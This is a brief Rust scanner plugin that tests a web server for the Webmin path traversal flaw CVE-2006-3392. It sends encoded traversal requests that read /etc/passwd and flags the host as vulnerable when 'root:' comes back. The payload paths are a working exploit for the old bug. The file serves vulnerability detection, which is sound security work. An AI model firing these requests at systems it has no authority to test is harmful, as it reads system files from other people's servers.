/* http-vuln-cve2006-3392-3 - CVE-2006-3392 Webmin traversal */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/..%01/..%01/..%01/etc/passwd",
        "/..%01/etc/passwd",
        "/etc/passwd",
    ];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if contains_ci(http_body(&resp), "root:") {
            append_out(ctx, &format!("{}{}",
                if found == 0 { "VULNERABLE: " } else { ", " }, p));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: CVE-2006-3392 Webmin traversal");
    } else {
        append_out(ctx, " (CVE-2006-3392 Webmin traversal)");
    }
    0
}
